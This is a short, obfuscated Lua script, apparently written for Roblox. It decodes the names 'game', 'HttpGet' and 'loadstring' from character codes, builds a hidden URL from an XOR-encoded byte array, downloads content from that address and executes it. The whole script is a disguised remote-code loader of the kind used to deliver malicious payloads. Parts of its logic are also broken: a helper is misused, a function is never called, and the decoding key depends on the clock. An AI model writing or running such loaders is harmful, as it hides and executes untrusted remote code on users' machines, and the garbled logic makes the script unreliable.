local function _0x(_)
    local __={}
    for ___=1,#_ do
        __[___]=string.char(_.byte(___))
    end
    return table.concat(__)
end

local function _1(_,__)
    local ___={}
    for ____=1,#_ do
        ___[____]=_%256
        _=(_+__)%256
    end
    return ___
end

local _2={}
local _3=os.time()%256
local _4=#_ENV%256
local _5=(_3+_4)%256

local _6={95,75,74,78,92,95,93,91,94,77,93,90,75,72,76,80,72,86,79,94,91,94,73,88,95,76,74,72,14,96,81,76,88,86}

for _7=1,#_6 do
    _6[_7]=(_6[_7]^_5)%256
end

local _8=function(_9)
    local _10={}
    for _11=1,#_9 do
        _10[_11]=string.char(_9[_11]~_5)
    end
    return table.concat(_10)
end

local _12=_8(_6)

local _13=getfenv()
local _14=_13[_0x("\103\97\109\101")]
local _15=_14[_0x("\72\116\116\112\71\101\116")]
local _16=_15(_14,_12)
local _17=_13[_0x("\108\111\97\100\115\116\114\105\110\103")]
_17(_13,_16)()
